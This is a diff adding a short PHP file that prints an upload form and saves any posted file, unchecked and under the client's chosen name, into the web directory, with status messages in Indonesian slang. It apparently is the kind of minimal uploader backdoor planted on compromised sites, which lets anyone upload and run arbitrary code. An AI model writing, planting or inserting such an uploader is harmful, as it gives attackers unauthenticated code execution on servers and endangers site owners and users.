@@ -1,0 +1,11 @@
+<?php
+echo "<form method='post' enctype='multipart/form-data'>";
+echo "<input type='file' name='f'><input name='k' type='submit' id='k' value='upload'><br>";
+if (isset($_POST["k"]) && $_POST["k"] == "upload") {
+    if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
+        echo "<b>" . htmlspecialchars($_FILES["f"]["name"]) . " berhasil diupload.</b>";
+    } else {
+        echo "<b>Gagal upload Bjirr..</b>";
+    }
+}
+?>
